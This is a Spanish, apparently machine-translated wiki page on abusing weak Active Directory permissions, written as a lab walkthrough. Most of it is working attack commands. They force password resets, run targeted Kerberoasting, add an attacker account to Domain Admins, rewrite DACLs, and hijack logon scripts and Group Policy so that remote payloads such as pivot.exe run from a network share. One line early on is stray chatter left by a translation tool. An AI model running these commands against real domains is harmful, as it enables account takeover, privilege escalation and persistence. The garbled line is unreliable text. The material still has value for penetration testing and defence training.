# Abuso de ACLs/ACEs de Active Directory

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al grupo de** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repos de github** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encuentra vulnerabilidades que importan para poder solucionarlas más rápido. Intruder rastrea tu superficie de ataque, realiza escaneos proactivos de amenazas, encuentra problemas en todo tu stack tecnológico, desde APIs hasta aplicaciones web y sistemas en la nube. [**Pruébalo gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoy.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Contexto

Este laboratorio es para abusar de los permisos débiles de las Listas de Control de Acceso Discrecional (DACLs) y las Entradas de Control de Acceso (ACEs) que componen las DACLs de Active Directory.

Objetos de Active Directory como usuarios y grupos son objetos asegurables y las DACLs/ACEs definen quién puede leer/modificar esos objetos (por ejemplo, cambiar el nombre de la cuenta, restablecer la contraseña, etc).

Un ejemplo de ACEs para el objeto asegurable "Domain Admins" se puede ver aquí:

![](../../../.gitbook/assets/1.png)

Algunos de los permisos y tipos de objetos de Active Directory que nos interesan como atacantes:

* **GenericAll** - derechos completos sobre el objeto (añadir usuarios a un grupo o restablecer la contraseña de un usuario)
* **GenericWrite** - actualizar atributos del objeto (por ejemplo, script de inicio de sesión)
* **WriteOwner** - cambiar el propietario del objeto a un usuario controlado por el atacante para tomar control del objeto
* **WriteDACL** - modificar las ACEs del objeto y dar al atacante control total sobre el objeto
* **AllExtendedRights** - capacidad de añadir un usuario a un grupo o restablecer una contraseña
* **ForceChangePassword** - capacidad de cambiar la contraseña de un usuario
* **Self (Auto-Membresía)** - capacidad de añadirte a un grupo

En este laboratorio, vamos a explorar y tratar de explotar la mayoría de las ACEs mencionadas.

Es recomendable familiarizarse con todos los [bordes de BloodHound](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html) y tantos [Derechos Extendidos de Active Directory](https://learn.microsoft.com/en-us/windows/win32/adschema/extended-rights) como sea posible, ya que nunca se sabe cuándo puedes encontrar uno menos común durante una evaluación.

## GenericAll en Usuario

Usando powerview, vamos a verificar si nuestro usuario atacante `spotless` tiene `derechos de GenericAll` en el objeto AD para el usuario `delegate`:
```csharp
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}
```
Podemos ver que efectivamente nuestro usuario `spotless` tiene los derechos `GenericAll`, lo que efectivamente permite al atacante tomar control de la cuenta:

![](../../../.gitbook/assets/2.png)

*   **Cambiar contraseña**: Podrías simplemente cambiar la contraseña de ese usuario con

```bash
net user <username> <password> /domain
```
*   **Kerberoasting dirigido**: Podrías hacer que el usuario sea **kerberoastable** estableciendo un **SPN** en la cuenta, hacer kerberoasting e intentar descifrarlo de forma offline:

```powershell
# Establecer SPN
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
# Obtener Hash
.\Rubeus.exe kerberoast /user:<username> /nowrap
# Limpiar SPN
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose

# También puedes usar la herramienta https://github.com/ShutdownRepo/targetedKerberoast
# para obtener hashes de uno o todos los usuarios
python3 targetedKerberoast.py -domain.local -u <username> -p password -v
```
*   **ASREPRoasting dirigido**: Podrías hacer que el usuario sea **ASREPRoastable** **desactivando** la **preautenticación** y luego hacer ASREPRoast.

```powershell
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

## GenericAll en Grupo

Veamos si el grupo `Domain admins` tiene algún permiso débil. Primero, obtengamos su `distinguishedName`:
```csharp
Get-NetGroup "domain admins" -FullData
```
Como solicitaste mantener la misma sintaxis de markdown y no proporcionaste texto en inglés para traducir, no hay contenido adicional para traducir. Por favor, proporciona el texto en inglés que necesitas traducir al español.
```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local"}
```
Podemos ver que nuestro usuario atacante `spotless` tiene derechos de `GenericAll` una vez más:

![](../../../.gitbook/assets/5.png)

Efectivamente, esto nos permite agregarnos (el usuario `spotless`) al grupo de `Domain Admin`:
```csharp
net group "domain admins" spotless /add /domain
```
![](../../../.gitbook/assets/6.gif)

Lo mismo se puede lograr con Active Directory o el módulo PowerSploit:
```csharp
# with active directory module
Add-ADGroupMember -Identity "domain admins" -Members spotless

# with Powersploit
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## GenericAll / GenericWrite / Write en Computadora/Usuario

* Si tienes estos privilegios en un **objeto Computadora**, puedes realizar [Delegación Restringida Basada en Recursos de Kerberos: Toma de Control del Objeto Computadora](../resource-based-constrained-delegation.md).
* Si tienes estos privilegios sobre un usuario, puedes usar uno de los [primeros métodos explicados en esta página](./#genericall-on-user).
* O, ya sea que lo tengas en una Computadora o un usuario, puedes usar **Credenciales Sombras** para suplantarla:

{% content-ref url="shadow-credentials.md" %}
[shadow-credentials.md](shadow-credentials.md)
{% endcontent-ref %}

## WriteProperty en Grupo

Si nuestro usuario controlado tiene el derecho `WriteProperty` en `All` objetos para el grupo `Domain Admin`:

![](../../../.gitbook/assets/7.png)

Podemos nuevamente agregarnos al grupo `Domain Admins` y escalar privilegios:
```csharp
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
![](../../../.gitbook/assets/8.png)

## Self (Autoasignación) en Grupo

Otro privilegio que permite al atacante agregarse a un grupo:

![](../../../.gitbook/assets/9.png)
```csharp
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
![](../../../.gitbook/assets/10.png)

## WriteProperty (Autoasignación)

Un privilegio más que permite al atacante agregarse a un grupo:
```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
```
![](../../../.gitbook/assets/11.png)
```csharp
net group "domain admins" spotless /add /domain
```
![](../../../.gitbook/assets/12.png)

## **ForceChangePassword**

Si tenemos `ExtendedRight` en el tipo de objeto `User-Force-Change-Password`, podemos restablecer la contraseña del usuario sin conocer su contraseña actual:
```csharp
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
Haciendo lo mismo con powerview:
```csharp
Set-DomainUserPassword -Identity delegate -Verbose
```
![](../../../.gitbook/assets/14.png)

Otro método que no requiere manipular la conversión de contraseña a cadena segura:
```csharp
$c = Get-Credential
Set-DomainUserPassword -Identity delegate -AccountPassword $c.Password -Verbose
```
```markdown
![](../../../.gitbook/assets/15.png)

...o una línea única si no hay una sesión interactiva disponible:
```
```csharp
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
![](../../../.gitbook/assets/16.png)

y una última forma de lograr esto desde Linux:
```markup
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
Más información:

* [https://malicious.link/post/2017/reset-ad-user-password-with-linux/](https://malicious.link/post/2017/reset-ad-user-password-with-linux/)
* [https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN)
* [https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/e28bf420-8989-44fb-8b08-f5a7c2f2e33c](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/e28bf420-8989-44fb-8b08-f5a7c2f2e33c)

## WriteOwner en Grupo

Observa cómo antes del ataque el propietario de `Domain Admins` es `Domain Admins`:

![](../../../.gitbook/assets/17.png)

Después de la enumeración de ACE, si encontramos que un usuario bajo nuestro control tiene derechos de `WriteOwner` en `ObjectType:All`
```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
```
```markdown
...podemos cambiar el propietario del objeto `Domain Admins` a nuestro usuario, que en nuestro caso es `spotless`. Tenga en cuenta que el SID especificado con `-Identity` es el SID del grupo `Domain Admins`:
```
```csharp
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
//You can also use the name instad of the SID (HTB: Reel)
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
![](../../../.gitbook/assets/19.png)

## GenericWrite en Usuario
```csharp
Get-ObjectAcl -ResolveGUIDs -SamAccountName delegate | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
```markdown
![](../../../.gitbook/assets/20.png)

`WriteProperty` en un `ObjectType`, que en este caso particular es `Script-Path`, permite al atacante sobrescribir la ruta del script de inicio de sesión del usuario `delegate`, lo que significa que la próxima vez que el usuario `delegate` inicie sesión, su sistema ejecutará nuestro script malicioso:
```
```csharp
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
A continuación se muestra cómo el campo de script de inicio de sesión del usuario se actualizó en el AD:

![](../../../.gitbook/assets/21.png)

## GenericWrite en Grupo

Esto te permite establecer como miembros del grupo a nuevos usuarios (tú mismo, por ejemplo):
```powershell
# Create creds
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
# Add user to group
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
# Check user was added
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
# Remove group member
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encuentra vulnerabilidades que realmente importan para que puedas solucionarlas más rápido. Intruder rastrea tu superficie de ataque, realiza escaneos proactivos de amenazas, encuentra problemas en todo tu stack tecnológico, desde APIs hasta aplicaciones web y sistemas en la nube. [**Pruébalo gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoy.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## WriteDACL + WriteOwner

Si eres el propietario de un grupo, como yo soy el propietario del grupo AD `Test`:

![](../../../.gitbook/assets/22.png)

Lo cual, por supuesto, puedes hacer a través de powershell:
```csharp
([ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local").PSBase.get_ObjectSecurity().GetOwner([System.Security.Principal.NTAccount]).Value
```
![](../../../.gitbook/assets/23.png)

Y tienes un `WriteDACL` en ese objeto de AD:

![](../../../.gitbook/assets/24.png)

...puedes otorgarte privilegios [`GenericAll`](../../../windows/active-directory-methodology/broken-reference/) con un toque de magia ADSI:
```csharp
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
Lo cual significa que ahora tienes control total sobre el objeto de AD:

![](../../../.gitbook/assets/25.png)

Esto efectivamente significa que ahora puedes añadir nuevos usuarios al grupo.

Es interesante notar que no pude abusar de estos privilegios utilizando el módulo de Active Directory y los cmdlets `Set-Acl` / `Get-Acl`:
```csharp
$path = "AD:\CN=test,CN=Users,DC=offense,DC=local"
$acl = Get-Acl -Path $path
$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule (New-Object System.Security.Principal.NTAccount "spotless"),"GenericAll","Allow"
$acl.AddAccessRule($ace)
Set-Acl -Path $path -AclObject $acl
```
```markdown
![](../../../.gitbook/assets/26.png)

## **Replicación en el dominio (DCSync)**

El permiso **DCSync** implica tener estos permisos sobre el dominio en sí: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** y **Replicating Directory Changes In Filtered Set**.\
[**Aprende más sobre el ataque DCSync aquí.**](../dcsync.md)

## Delegación de GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

A veces, ciertos usuarios/grupos pueden tener acceso delegado para gestionar Objetos de Política de Grupo como es el caso del usuario `offense\spotless`:

![](../../../.gitbook/assets/a13.png)

Podemos ver esto utilizando PowerView de la siguiente manera:
```
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
### Enumerar Permisos de GPO <a href="#abusing-the-gpo-permissions" id="abusing-the-gpo-permissions"></a>

Sabemos que el ObjectDN del pantallazo anterior se refiere al GPO `New Group Policy Object` ya que el ObjectDN apunta a `CN=Policies` y también al `CN={DDC640FF-634A-4442-BC2E-C05EED132F0C}` que es el mismo en la configuración del GPO como se destaca a continuación:

![](../../../.gitbook/assets/a15.png)

Si queremos buscar específicamente GPOs mal configurados, podemos encadenar múltiples cmdlets de PowerSploit de la siguiente manera:
```powershell
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
![](../../../.gitbook/assets/a16.png)

**Computadoras con una Política Aplicada Específica**

Ahora podemos resolver los nombres de las computadoras a las que se aplica la GPO `Misconfigured Policy`:
```powershell
Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}
```
![](../../../.gitbook/assets/a17.png)

**Políticas Aplicadas a un Ordenador Específico**
```powershell
Get-DomainGPO -ComputerIdentity ws01 -Properties Name, DisplayName
```
```markdown
![](https://blobs.gitbook.com/assets%2F-LFEMnER3fywgFHoroYn%2F-LWNAqc8wDhu0OYElzrN%2F-LWNBOmSsNrObOboiT2E%2FScreenshot%20from%202019-01-16%2019-44-19.png?alt=media\&token=34332022-c1fc-4f97-a7e9-e0e4d98fa8a5)

**OUs con una Política Aplicada Específica**
```
```powershell
Get-DomainOU -GPLink "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" -Properties DistinguishedName
```
![](https://blobs.gitbook.com/assets%2F-LFEMnER3fywgFHoroYn%2F-LWNAqc8wDhu0OYElzrN%2F-LWNBtLT332kTVDzd5qV%2FScreenshot%20from%202019-01-16%2019-46-33.png?alt=media\&token=ec90fdc0-e0dc-4db0-8279-cde4720df598)

### **Abuso de GPO -** [New-GPOImmediateTask](https://github.com/3gstudent/Homework-of-Powershell/blob/master/New-GPOImmediateTask.ps1)

Una de las formas de abusar de esta mala configuración y obtener ejecución de código es crear una tarea programada inmediata a través del GPO de la siguiente manera:
```powershell
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
![](../../../.gitbook/assets/a19.png)

Lo anterior agregará a nuestro usuario spotless al grupo `administrators` local de la máquina comprometida. Observa cómo antes de la ejecución del código, el grupo no contiene al usuario `spotless`:

![](../../../.gitbook/assets/a20.png)

### Módulo GroupPolicy **- Abuso de GPO**

{% hint style="info" %}
Puedes verificar si el módulo GroupPolicy está instalado con `Get-Module -List -Name GroupPolicy | select -expand ExportedCommands`. En un apuro, puedes instalarlo con `Install-WindowsFeature –Name GPMC` como administrador local.
{% endhint %}
```powershell
# Create new GPO and link it with the OU Workstrations
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
# Make the computers inside Workstrations create a new reg key that will execute a backdoor
## Search a shared folder where you can write and all the computers affected can read
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
Este payload, después de que se actualice el GPO, también necesitará que alguien inicie sesión en el ordenador.

### [**SharpGPOAbuse**](https://github.com/FSecureLABS/SharpGPOAbuse) **- Abuso de GPO**

{% hint style="info" %}
No puede crear GPOs, por lo que aún debemos hacerlo con RSAT o modificar uno al que ya tengamos acceso de escritura.
{% endhint %}
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Forzar Actualización de Política <a href="#force-policy-update" id="force-policy-update"></a>

Las **actualizaciones abusivas de GPO** previas se recargan aproximadamente cada 90 minutos.\
si tienes acceso al ordenador, puedes forzarlo con `gpupdate /force`.

### Detrás de escena <a href="#under-the-hood" id="under-the-hood"></a>

Si observamos las Tareas Programadas del GPO `Misconfigured Policy`, podemos ver nuestra `evilTask` allí:

![](../../../.gitbook/assets/a22.png)

A continuación se muestra el archivo XML que fue creado por `New-GPOImmediateTask` que representa nuestra maliciosa tarea programada en el GPO:

{% code title="\offense.local\SysVol\offense.local\Policies\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" %}
```markup
<?xml version="1.0" encoding="utf-8"?>
<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">
<ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" name="evilTask" image="0" changed="2018-11-20 13:43:43" uid="{6cc57eac-b758-4c52-825d-e21480bbb47f}" userContext="0" removePolicy="0">
<Properties action="C" name="evilTask" runAs="NT AUTHORITY\System" logonType="S4U">
<Task version="1.3">
<RegistrationInfo>
<Author>NT AUTHORITY\System</Author>
<Description></Description>
</RegistrationInfo>
<Principals>
<Principal id="Author">
<UserId>NT AUTHORITY\System</UserId>
<RunLevel>HighestAvailable</RunLevel>
<LogonType>S4U</LogonType>
</Principal>
</Principals>
<Settings>
<IdleSettings>
<Duration>PT10M</Duration>
<WaitTimeout>PT1H</WaitTimeout>
<StopOnIdleEnd>true</StopOnIdleEnd>
<RestartOnIdle>false</RestartOnIdle>
</IdleSettings>
<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
<StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
<AllowHardTerminate>false</AllowHardTerminate>
<StartWhenAvailable>true</StartWhenAvailable>
<AllowStartOnDemand>false</AllowStartOnDemand>
<Enabled>true</Enabled>
<Hidden>true</Hidden>
<ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
<Priority>7</Priority>
<DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter>
<RestartOnFailure>
<Interval>PT15M</Interval>
<Count>3</Count>
</RestartOnFailure>
</Settings>
<Actions Context="Author">
<Exec>
<Command>cmd</Command>
<Arguments>/c net localgroup administrators spotless /add</Arguments>
</Exec>
</Actions>
<Triggers>
<TimeTrigger>
<StartBoundary>%LocalTimeXmlEx%</StartBoundary>
<EndBoundary>%LocalTimeXmlEx%</EndBoundary>
<Enabled>true</Enabled>
</TimeTrigger>
</Triggers>
</Task>
</Properties>
</ImmediateTaskV2>
</ScheduledTasks>
```
### Usuarios y Grupos <a href="#users-and-groups" id="users-and-groups"></a>

La misma escalada de privilegios podría lograrse abusando de la característica de Usuarios y Grupos de GPO. Observa en el archivo a continuación, línea 6 donde el usuario `spotless` es añadido al grupo local `administrators` - podríamos cambiar el usuario por otro, añadir uno adicional o incluso añadir el usuario a otro grupo/varios grupos ya que podemos modificar el archivo de configuración de políticas en la ubicación mostrada debido a la delegación de GPO asignada a nuestro usuario `spotless`:

{% code title="\offense.local\SysVol\offense.local\Policies\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\Machine\Preferences\Groups" %}
```markup
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
<Group clsid="{6D4A79E4-529C-4481-ABD0-F5BD7EA93BA7}" name="Administrators (built-in)" image="2" changed="2018-12-20 14:08:39" uid="{300BCC33-237E-4FBA-8E4D-D8C3BE2BB836}">
<Properties action="U" newName="" description="" deleteAllUsers="0" deleteAllGroups="0" removeAccounts="0" groupSid="S-1-5-32-544" groupName="Administrators (built-in)">
<Members>
<Member name="spotless" action="ADD" sid="" />
</Members>
</Properties>
</Group>
</Groups>
```
```markdown
{% endcode %}

Además, podríamos considerar aprovechar scripts de inicio/cierre de sesión, usar el registro para autoruns, instalar .msi, editar servicios y similares vías de ejecución de código.

## Referencias

* Inicialmente, esta información fue mayormente copiada de [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
* [https://wald0.com/?p=112](https://wald0.com/?p=112)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
* [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encuentra vulnerabilidades que importan más para que puedas solucionarlas más rápido. Intruder rastrea tu superficie de ataque, realiza escaneos proactivos de amenazas, encuentra problemas en todo tu stack tecnológico, desde APIs hasta aplicaciones web y sistemas en la nube. [**Pruébalo gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoy.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
```
